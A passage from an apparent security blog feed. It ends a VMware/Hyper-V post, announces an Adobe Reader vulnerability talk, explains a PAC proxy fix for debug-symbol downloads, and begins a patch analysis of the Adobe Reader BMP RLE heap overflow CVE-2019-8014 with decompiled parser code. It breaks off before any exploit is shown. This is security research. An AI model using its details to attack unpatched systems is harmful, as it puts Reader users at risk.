Hyper-V is enabled. You no longer have to choose between running VMware Workstation and Windows features like WSL, Device Guard and Credential Guard. When Hyper-V is enabled, ULM mode will automatically be used so you can run VMware Workstation normally. If you don’t use Hyper-V at all, VMware Workstation is smart enough to detect this and the VMM will be used.</p><p><strong>System Requirements</strong></p><p>To run Workstation/Player using the Windows Hypervisor APIs, the minimum required Windows 10 version is Windows 10 20H1 build 19041.264. VMware Workstation/Player minimum version is 15.5.5.</p></blockquote><p>不知道这个新引入的 User Level Monitor 对虚拟机的性能是否有影响。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在 Windows 中启用 Hyper-V 之后，VMware Workstation 就不能用了，会提示“VMware Workstation 与 Device/Credential Guard 不兼容。在禁用 Device/Credential Guard 后，可以运行 VMware Workstation”，然而禁用 Device/Credential Guard 并不能解决问题。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="Hyper-V" scheme="http://programlife.net/categories/Virtualization/Hyper-V/"/>
    
    
      <category term="Hyper-V" scheme="http://programlife.net/tags/Hyper-V/"/>
    
      <category term="VMware Workstation" scheme="http://programlife.net/tags/VMware-Workstation/"/>
    
  </entry>
  
  <entry>
    <title>Pwning Adobe Reader Multiple Times with Malformed Strings</title>
    <link href="http://programlife.net/2020/04/29/pwning-adobe-reader-multiple-times-with-malformed-strings/"/>
    <id>http://programlife.net/2020/04/29/pwning-adobe-reader-multiple-times-with-malformed-strings/</id>
    <published>2020-04-29T00:13:37.000Z</published>
    <updated>2020-04-29T02:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>这次我在 HITB Lockdown Livestream 上发表了题为《<strong>Pwning Adobe Reader Multiple Times with Malformed Strings</strong>》的演讲，该演讲本来是为 HITB 2020 Amsterdam 准备的，但由于受疫情影响，主办方被迫取消了原来的会议安排，转而在 YouTube 上举办了一次免费的在线会议。</p><a id="more"></a><p>这次的议题是我在 ZeroNights 2019 上的演讲《<strong>Two Bytes to Rule Adobe Reader Twice: The Black Magic Behind the Byte Order Mark</strong>》的进一步研究，因此会有接近 40% 的内容是重复的。这次演讲精简了上一次演讲的内容，增加了对 Adobe JavaScript 引擎相关数据结构的分析，同时增加了 2 个新的可利用漏洞；最重要的是，这次我花了不少时间写了一篇非常详细的 Paper，方便感兴趣的同学自行开展漏洞分析工作。</p><p>值得一提的是，这次新增加的 2 个漏洞其实已经存了很久了，而距离上一次演讲已经过去了将近半年的时间，所以如果有人认真研究了我上一次演讲的内容的话，发现这 2 个漏洞也不是什么难事 :-)</p><p>议题文档：</p><ul><li><a href="/uploads/202004/pwning_adobe_reader_multiple_times_with_malformed_strings_slides.pdf">Pwning Adobe Reader Multiple Times with Malformed Strings - Slides</a></li><li><a href="/uploads/202004/pwning_adobe_reader_multiple_times_with_malformed_strings_whitepaper.pdf">Pwning Adobe Reader Multiple Times with Malformed Strings - Paper</a></li></ul><p><img src="/uploads/202004/hitb-livestream.png" alt="HITB Lockdown Livestream 演讲"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我在 HITB Lockdown Livestream 上发表了题为《&lt;strong&gt;Pwning Adobe Reader Multiple Times with Malformed Strings&lt;/strong&gt;》的演讲，该演讲本来是为 HITB 2020 Amsterdam 准备的，但由于受疫情影响，主办方被迫取消了原来的会议安排，转而在 YouTube 上举办了一次免费的在线会议。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Adobe Reader" scheme="http://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="CVE-2019-7032" scheme="http://programlife.net/tags/CVE-2019-7032/"/>
    
      <category term="CVE-2019-8199" scheme="http://programlife.net/tags/CVE-2019-8199/"/>
    
      <category term="CVE-2020-3804" scheme="http://programlife.net/tags/CVE-2020-3804/"/>
    
      <category term="CVE-2020-3805" scheme="http://programlife.net/tags/CVE-2020-3805/"/>
    
      <category term="PDF" scheme="http://programlife.net/tags/PDF/"/>
    
  </entry>
  
  <entry>
    <title>Windows 调试符号下载代理配置</title>
    <link href="http://programlife.net/2020/02/23/windows-debugging-symbols-proxy-rules/"/>
    <id>http://programlife.net/2020/02/23/windows-debugging-symbols-proxy-rules/</id>
    <published>2020-02-23T00:13:37.000Z</published>
    <updated>2020-02-23T02:16:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近在 Windows 下调试程序时，发现无法下载微软提供的调试符号了（提示 <code>E_PDB_NOT_FOUND</code>），一开始以为是微软自己的原因，因为以往的经验表明，微软在 Patch Tuesday 之后的一段时间里可能就是无法正常下载调试符号。</p><p><img src="/uploads/202002/ida-pro-pdb-not-found.png" alt="IDA Pro 无法下载 Notepad 的调试符号"></p><a id="more"></a><p>后来发现，这次是无法从微软的服务器下载任何调试符号，比如使用 WinDbg 自带的 <code>symchk.exe</code> 无法给 System32 目录下的任一文件下载调试符号，而且在不同的机器上（拥有不同的代理上网环境）均不能下载调试符号，这就非常奇怪了。</p><p>笔者在某不存在的社交网站上反应了这个问题，有网友表示需要使用 VPN，也有网友表示需要绕过长城，还有网友表示 VPN 也不解决问题，而国外友人则表示完全不存在这个问题！很显然，这跟国内复杂的网络环境不无关系！</p><p>笔者打开了 Wireshark，想看看从微软的服务器下载调试符号时到底发生了什么。比如，在给 Notepad 下载调试符号时，后台访问的 URL 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://msdl.microsoft.com/download/symbols/notepad.pdb/BC0D363AF49A0E2C05B06DA4535DA0C71/notepad.pdb</span><br></pre></td></tr></table></figure><p>接着会重定向到以下地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://vsblobprodscussu5shard60.blob.core.windows.net/b-4712e0edc5a240eabf23330d7df68e77/F6311B221044787072987B74992D6DE770FCBBFED09C2853B4F10350CB964FF900.blob?sv=2017-04-17&amp;sr=b&amp;si=1&amp;sig=ulHtMVJpGWuEvNczzOR6J3g2rXS1s9qwwmEqJ1x63wg%3D&amp;spr=https&amp;se=2020-02-24T01%3A57%3A40Z&amp;rscl=x-e2eid-66439cf8-65874550-b9c5b293-e8bf7391-session-627c05ca-398743d1-b7a6ab61-b0fbc28f</span><br></pre></td></tr></table></figure><p>Chrome 提示 <code>ERR_CONNECTION_RESET</code> ，显然 <code>vsblobprodscussu5shard60.blob.core.windows.net</code> 被 Block 了。那为什么此时代理不管用了呢？而代理服务器本身是可以正常访问这个地址的，或者说，基于代理服务器上的 VPN 也可以正常访问这个地址。</p><p>后来发现，笔者使用的是 PAC 代理上网模式（<strong>Proxy Auto-Config</strong>，<a href="https://zh.wikipedia.org/zh-hans/%E4%BB%A3%E7%90%86%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE" target="_blank" rel="noopener">代理自动配置</a>），上网流量要不要经过代理服务器是根据 PAC 规则文件来定的（相对全局代理模式更加智能），而 <code>windows.net</code> 并没有出现在一些流行的 PAC 规则文件中，因此这里无法正常下载调试符号文件。</p><p>解决方案非常简单，给 PAC 规则文件增加一条记录 <code>.windows.net</code> ，表示支持 <code>windows.net</code> 下所有地址的访问。</p><p><img src="/uploads/202002/across-the-great-wall.png" alt="越过长城，走向世界"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在 Windows 下调试程序时，发现无法下载微软提供的调试符号了（提示 &lt;code&gt;E_PDB_NOT_FOUND&lt;/code&gt;），一开始以为是微软自己的原因，因为以往的经验表明，微软在 Patch Tuesday 之后的一段时间里可能就是无法正常下载调试符号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/uploads/202002/ida-pro-pdb-not-found.png&quot; alt=&quot;IDA Pro 无法下载 Notepad 的调试符号&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
    
      <category term="WinDbg" scheme="http://programlife.net/tags/WinDbg/"/>
    
  </entry>
  
  <entry>
    <title>Deep Analysis of CVE-2019-8014 The Vulnerability Ignored 6 Years Ago</title>
    <link href="http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-en/"/>
    <id>http://programlife.net/2019/09/12/deep-analysis-of-cve-2019-8014-en/</id>
    <published>2019-09-12T00:13:37.000Z</published>
    <updated>2020-05-20T14:36:22.000Z</updated>
    
    <content type="html"><![CDATA[<p><em>This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, it’s a patch bypass of CVE-2013-2729 which was <del><strong>fixed</strong></del> six years ago. This post also discusses how to exploit the vulnerability.</em></p><p>Author: <strong>Ke Liu of Tencent Security Xuanwu Lab</strong></p><a id="more"></a><h2 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h2><p>Adobe released security updates for Adobe Acrobat and Reader in <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> in August. As usual, lots of vulnerabilities were fixed in the updates. When I was reviewing the corresponding advisories on <a href="https://www.zerodayinitiative.com/advisories/published/" target="_blank" rel="noopener">ZDI</a> , my attention was attracted by one of them: <a href="https://www.zerodayinitiative.com/advisories/ZDI-19-725/" target="_blank" rel="noopener">ZDI-19-725</a> / <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014" target="_blank" rel="noopener">CVE-2019-8014</a> . Following text is the title and description of this case:</p><blockquote><p>Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability</p><p>The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.</p></blockquote><p>What surprised me most is that the flaw exists within the parsing of run length encoding in BMP images because I remembered that six years ago a similar case <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2729" target="_blank" rel="noopener">CVE-2013-2729</a> was fixed in Adobe Reader. If you have the same wondering that what’s the relationship between CVE-2013-2729 and CVE-2019-8014, then let me reveal the truth for you.</p><p>By the way, the credit of CVE-2019-8014 goes to <code>ktkitty (https://ktkitty.github.io)</code> .</p><h2 id="0x02-Debugging-Environment"><a href="#0x02-Debugging-Environment" class="headerlink" title="0x02. Debugging Environment"></a>0x02. Debugging Environment</h2><p>Before diving deep into the details of the vulnerability, let’s set up the debugging environment first. According to <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html" target="_blank" rel="noopener">APSB19-41</a> , <code>2019.012.20035</code> and earlier versions of Adobe Acrobat and Reader on Windows were affected, and the released version was <code>2019.012.20036</code> . We’ll carry out our analysis on these two versions.</p><p>Steps to install Adobe Acrobat Reader DC <code>2019.012.20035</code> :</p><ol><li>Download and install <code>2019.012.20034</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220034/" target="_blank" rel="noopener">Download Link</a>)</li><li>Upgrade to <code>2019.012.20035</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220035/" target="_blank" rel="noopener">Download Link</a>)</li></ol><p>Steps to install Adobe Acrobat Reader DC <code>2019.012.20036</code> :</p><ol><li>Download and install <code>2019.012.20036</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220036/" target="_blank" rel="noopener">Download Link</a>)</li></ol><p>Please remember to disconnect the Internet or disable the <em>Adobe Acrobat Update Service</em> , otherwise your Adobe Acrobat Reader DC will be updated automatically.</p><h2 id="0x03-Bitmap-Structures"><a href="#0x03-Bitmap-Structures" class="headerlink" title="0x03. Bitmap Structures"></a>0x03. Bitmap Structures</h2><p>Again, before diving deep into the details of the vulnerability, let’s learn some essential concepts of bitmap images. You can skip this section if you’re already familiar with it.</p><h3 id="3-1-Structures"><a href="#3-1-Structures" class="headerlink" title="3.1 Structures"></a>3.1 Structures</h3><p>Generally speaking, a bitmap image is composed of four parts:</p><ol><li>Bitmap File Header</li><li>Bitmap Info Header</li><li>RGBQUAD Array</li><li>Bitmap Data</li></ol><h4 id="3-1-1-Bitmap-File-Header"><a href="#3-1-1-Bitmap-File-Header" class="headerlink" title="3.1.1 Bitmap File Header"></a>3.1.1 Bitmap File Header</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader" target="_blank" rel="noopener">BITMAPFILEHEADER</a></strong> structure contains information about the type, size, and layout of the bitmap file. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span></span><br><span class="line">  WORD  bfType;         <span class="comment">// 'BM'</span></span><br><span class="line">  DWORD bfSize;         <span class="comment">// size of the bitmap file</span></span><br><span class="line">  WORD  bfReserved1;    <span class="comment">// 0</span></span><br><span class="line">  WORD  bfReserved2;    <span class="comment">// 0</span></span><br><span class="line">  DWORD bfOffBits;      <span class="comment">// offset of the bitmap bits</span></span><br><span class="line">&#125; BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;</span><br></pre></td></tr></table></figure><h4 id="3-1-2-Bitmap-Info-Header"><a href="#3-1-2-Bitmap-Info-Header" class="headerlink" title="3.1.2 Bitmap Info Header"></a>3.1.2 Bitmap Info Header</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/previous-versions/dd183376(v=vs.85" target="_blank" rel="noopener">BITMAPINFOHEADER</a>)</strong> structure contains information about the dimensions and color format of the bitmap file. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">  DWORD biSize;             <span class="comment">// sizeof(BITMAPINFOHEADER)</span></span><br><span class="line">  LONG  biWidth;            <span class="comment">// bitmap width</span></span><br><span class="line">  LONG  biHeight;           <span class="comment">// bitmap height</span></span><br><span class="line">  WORD  biPlanes;           <span class="comment">// must be 1</span></span><br><span class="line">  WORD  biBitCount;         <span class="comment">// bits per pixel</span></span><br><span class="line">  DWORD biCompression;      <span class="comment">// compression method</span></span><br><span class="line">  DWORD biSizeImage;        <span class="comment">// size of bitmap bits</span></span><br><span class="line">  LONG  biXPelsPerMeter;    <span class="comment">// horizontal resolution, pixels-per-meter</span></span><br><span class="line">  LONG  biYPelsPerMeter;    <span class="comment">// vertical resolution, pixels-per-meter</span></span><br><span class="line">  DWORD biClrUsed;          <span class="comment">// number of color indexes in the color table</span></span><br><span class="line">  DWORD biClrImportant;     <span class="comment">// number of color indexes that are required</span></span><br><span class="line">&#125; BITMAPINFOHEADER, *PBITMAPINFOHEADER;</span><br></pre></td></tr></table></figure><p>The value of <code>biCompression</code> represents the compression method of the bitmap. Following are some of the possible values of it:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RGB  0  <span class="comment">// uncompressed format</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE8 1  <span class="comment">// run-length encoded (RLE) format with 8 bpp</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE4 2  <span class="comment">// run-length encoded (RLE) format with 4 bpp</span></span></span><br><span class="line"><span class="comment">// other compression methods...</span></span><br></pre></td></tr></table></figure><h4 id="3-1-3-RGBQUAD-Array"><a href="#3-1-3-RGBQUAD-Array" class="headerlink" title="3.1.3 RGBQUAD Array"></a>3.1.3 RGBQUAD Array</h4><p>The <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-rgbquad" target="_blank" rel="noopener">RGBQUAD</a></strong> structure describes a color consisting of relative intensities of red, green, and blue. Following is the definition of this structure:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">  BYTE rgbBlue;</span><br><span class="line">  BYTE rgbGreen;</span><br><span class="line">  BYTE rgbRed;</span><br><span class="line">  BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure><p>The elements of the RGBQUAD array make up the color table. The number of entries in the array depends on the values of the <code>biBitCount</code> and <code>biClrUsed</code> members of the <strong>BITMAPINFOHEADER</strong> structure.</p><h4 id="3-1-4-Bitmap-Data"><a href="#3-1-4-Bitmap-Data" class="headerlink" title="3.1.4 Bitmap Data"></a>3.1.4 Bitmap Data</h4><p>Bits data of the bitmap. The layout of this section depends on the compression method of the bitmap.</p><p>One thing should be noted is that usually pixels are stored “bottom-up”, starting in the lower left corner, going from left to right, and then row by row from the bottom to the top of the image [<a href="https://en.wikipedia.org/wiki/BMP_file_format#Pixel_array_(bitmap_data" target="_blank" rel="noopener">wikipedia</a>)].</p><h3 id="3-2-Run-Length-Encoding"><a href="#3-2-Run-Length-Encoding" class="headerlink" title="3.2 Run Length Encoding"></a>3.2 Run Length Encoding</h3><p>Two types of <strong>run length encoding</strong> methods can be used in bitmap files: <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/73b57f24-6d78-4eeb-9c06-8f892d88f1ab" target="_blank" rel="noopener">RLE4</a> and <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/b64d0c0b-bb80-4b53-8382-f38f264eb685" target="_blank" rel="noopener">RLE8</a> .</p><h4 id="3-2-1-RLE8"><a href="#3-2-1-RLE8" class="headerlink" title="3.2.1 RLE8"></a>3.2.1 RLE8</h4><p>The RLE8 compression algorithm is used to compress an 8-bit bitmap. This format specifies encoded and absolute modes, and either mode can occur anywhere in a given bitmap.</p><p><strong>Encoded mode</strong> involves two bytes:</p><ul><li><p>If the first byte of a pair is greater than zero, it specifies the number of consecutive pixels to be drawn using the color index that is contained in the second byte.</p></li><li><p>If the first byte of a pair is zero and the second byte is 0x02 or less, the second byte is an escape value that can denote the end of a line, the end of the bitmap, or a relative pixel position, as follows.</p><ul><li>0x00 - End of line</li><li>0x01 - End of bitmap</li><li>0x02 - Delta</li></ul></li></ul><p>When a delta is specified, the 2 bytes following the escape value contain unsigned values indicating the horizontal and vertical offsets of the next pixel relative to the current position.</p><p>In <strong>absolute mode</strong>, the first byte is zero, and the second byte is a value in the range 0x03 through 0xFF. The second byte represents the number of bytes that follow, each of which contains the color index of a single pixel. In absolute mode, each run is aligned on a word boundary.</p><p>The following example shows the hexadecimal contents of an 8-bit compressed bitmap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]</span><br><span class="line">[02 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>The bitmap expands as follows (two-digit values represent a color index for a single pixel):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">04 04 04</span><br><span class="line">06 06 06 06 06</span><br><span class="line">45 56 67</span><br><span class="line">78 78</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">78 78</span><br><span class="line">end of line</span><br><span class="line">1E 1E 1E 1E 1E 1E 1E 1E 1E</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h4 id="3-2-2-RLE4"><a href="#3-2-2-RLE4" class="headerlink" title="3.2.2 RLE4"></a>3.2.2 RLE4</h4><p>The RLE4 compression algorithm is used to compress a 4-bit bitmap. This format specifies encoded and absolute modes, and either mode can occur anywhere in a given bitmap.</p><p><strong>Encoded mode</strong> involves two bytes. If the first byte of a pair is greater than zero, it specifies the number of consecutive pixels to be drawn using the two color indexes that are contained in the high-order and low-order bits of the second byte.</p><p>The first pixel is drawn using the color specified by the high-order 4 bits, the second is drawn using the color in the low-order 4 bits, the third is drawn using the color in the high-order 4 bits, and so on, until all the pixels specified by the first byte have been drawn.</p><p>If the first byte of a pair is zero and the second byte is 0x02 or less, the second byte is an escape value that can denote the end of a line, the end of the bitmap, or a relative pixel position, as follows.</p><ul><li>0x00 - End of line</li><li>0x01 - End of bitmap</li><li>0x02 - Delta</li></ul><p>When a delta is specified, the 2 bytes following the escape value contain unsigned values indicating the horizontal and vertical offsets of the next pixel relative to the current position.</p><p>In <strong>absolute mode</strong>, the first byte is zero, and the second byte is a value in the range 0x03 through 0xFF. The second byte contains the number of 4-bit color indexes that follow. Subsequent bytes contain color indexes in their high- and low-order 4 bits, one color index for each pixel. In absolute mode, each run is aligned on a word boundary.</p><p>The following example shows the hexadecimal contents of a 4-bit compressed bitmap:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]</span><br><span class="line">[04 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>The bitmap expands as follows:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 4 0</span><br><span class="line">0 6 0 6 0</span><br><span class="line">4 5 5 6 6 7</span><br><span class="line">7 8 7 8</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">7 8 7 8</span><br><span class="line">end of line</span><br><span class="line">1 E 1 E 1 E 1 E 1</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h2 id="0x04-Vulnerability-Details"><a href="#0x04-Vulnerability-Details" class="headerlink" title="0x04. Vulnerability Details"></a>0x04. Vulnerability Details</h2><h3 id="4-1-Code-Identification"><a href="#4-1-Code-Identification" class="headerlink" title="4.1 Code Identification"></a>4.1 Code Identification</h3><p>According to the advisory on ZDI’s website, we know that the flaw exists within the <strong>AcroForm</strong> module. It’s the forms plug-in of Adobe Acrobat Reader DC and is responsible for parsing <a href="https://en.wikipedia.org/wiki/XFA" target="_blank" rel="noopener">XFA forms</a> . Following is the path of binary file of this plug-in:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%PROGRAMFILES(X86)%\Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api</span><br></pre></td></tr></table></figure><p>Generally speaking, when doing patch analysis we may want to use <a href="https://www.zynamics.com/bindiff.html" target="_blank" rel="noopener">BinDiff</a> to help identify the changed functions between the old and new versions of the binary file. But it won’t be easy to find the target one if too many functions were changed. And that’s the case of <code>AcroForm.api</code> . Here we’ll use some trivial tricks to identify the related functions.</p><p>The following analysis was carried out on Adobe Acrobat Reader DC <code>2019.012.20035</code> . The same method can be applied to version <code>2019.012.20036</code> .</p><ol><li>Search string <code>PNG</code> in IDA and we’ll find one at <code>.rdata:20F9A374</code> </li><li>Find cross references to <code>20F9A374</code> and we’ll go to function <code>sub_20CF3A3F</code> </li><li>Obviously function <code>sub_20CF3A3F</code> is responsible for identifying the type of the image</li><li>Find cross references to <code>sub_20CF3A3F</code> and we’ll go to function <code>sub_20CF4BE8</code> </li><li>Function <code>sub_20CF4BE8</code> will call corresponding image parsing functions according to image types</li><li>Function <code>sub_20CF3E5F</code> , which will be called by function <code>sub_20CF4870</code> , is responsible for parsing bitmap images</li></ol><p>The result of BinDiff shows that some basic blocks were changed in function <code>sub_20CF3E5F</code> . Let’s take the basic block which begins at <code>20CF440F</code> as an example to show the difference.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F in AcroForm 2019.012.20035</span></span><br><span class="line"><span class="keyword">if</span> ( v131 &gt;= v26 || (<span class="keyword">unsigned</span> __int8)v127 + v43 &gt; v123 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F in AcroForm 2019.012.20036</span></span><br><span class="line">v56 = (<span class="keyword">unsigned</span> __int8)v130 + v43;</span><br><span class="line"><span class="keyword">if</span> ( v134 &gt;= v26 || v56 &gt; v126 || v56 &lt; v43 || v56 &lt; (<span class="keyword">unsigned</span> __int8)v130 )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure><p>It’s obvious that the code was changed to prevent integer overflow circumstances.</p><h3 id="4-2-Vulnerability-Analysis"><a href="#4-2-Vulnerability-Analysis" class="headerlink" title="4.2 Vulnerability Analysis"></a>4.2 Vulnerability Analysis</h3><p>Thanks to <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliam’s write up for CVE-2013-2729</a> , we can quickly understand what’s going on in function <code>sub_20CF3E5F</code> .</p><h4 id="4-2-1-RLE8-Decoding"><a href="#4-2-1-RLE8-Decoding" class="headerlink" title="4.2.1 RLE8 Decoding"></a>4.2.1 RLE8 Decoding</h4><p>Following pseudo code, which was extracted from function <code>sub_20CF3E5F</code> , was responsible for parsing the RLE8 compressed data.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">1</span> )  <span class="comment">// RLE8 algorithm</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, from left to right</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, from bottom to top</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// read 2 bytes</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                         <span class="comment">// first byte != 0</span></span><br><span class="line">      &#123;                                         <span class="comment">// means have compressed data</span></span><br><span class="line">        <span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span 